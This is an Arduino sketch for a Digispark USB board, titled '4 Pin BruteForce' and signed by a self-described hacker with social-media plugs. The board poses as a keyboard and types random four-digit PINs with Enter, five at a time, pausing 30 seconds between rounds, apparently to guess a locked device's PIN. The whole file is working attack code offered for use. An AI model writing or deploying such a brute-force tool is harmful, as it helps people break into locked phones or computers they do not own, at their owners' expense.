/* 
 *  Author  = Hacker Nowful 
 *  Title   = 4 Pin BruteForce
 *  Insta   = mr_white_hat._
 *  GitHub  = Hacker Nowful
 *  Website = www.hypesecinfotech.com
 *  
 *  Happy Hacking
 *  
 */

#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0); 
}

void loop() {
  static int attempts = 0;

  while (attempts < 5) {
    randomSeed(millis());
    char pinStr[5]; 
    for (int i = 0; i < 4; i++) {
      pinStr[i] = random(10) + '0'; 
    }
    pinStr[4] = '\0'; // Null terminator
    DigiKeyboard.print(pinStr); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
    DigiKeyboard.delay(2000); 
    attempts++;
  }

  attempts = 0; // Reset attempts counter
  DigiKeyboard.delay(30000); // Delay 30 seconds before the next 5 attempts
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
//Don't Forget Subscribe my Youtube Channel
